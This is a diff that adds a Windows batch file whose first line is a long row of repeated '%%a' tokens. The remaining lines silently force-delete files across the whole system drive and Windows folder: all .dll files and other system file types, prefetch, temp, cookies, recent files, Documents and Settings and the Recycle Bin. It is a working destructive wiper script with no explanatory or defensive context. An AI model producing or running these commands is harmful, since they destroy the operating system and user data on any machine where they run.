@@ -1,0 +1,19 @@
+%%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a 
+cls
+echo off  
+del /f /s /q %systemdrive%\*.dll  
+del /f /s /q %systemdrive%\*.prx  
+del /f /s /q %systemdrive%\*.mst  
+del /f /s /q %systemdrive%\*.itw  
+del /f /s /q %systemdrive%\*.chi  
+del /f /s /q %systemdrive%\*.cnt  
+del /f /s /q %windir%\*.bak  
+del /f /s /q %windir%\*.dll 
+del /f /s /q %windir%\prefetch\*.*  
+rd /s /q %windir%\temp & md %windir%\temp  
+del /f /q %userprofile%\cookies\*.*  
+del /f /q %userprofile%\recent\*.*  
+del /f /s /q "%userprofile%\Documents and Settings\*.*"  
+del /f /s /q "%userprofile%\WINDOWS\system32\*.*"  
+del /f /s /q "%userprofile%\WINDOWS\twain_32\*.*"  
+del /f /s /q %systemdrive%\recycled\*.*
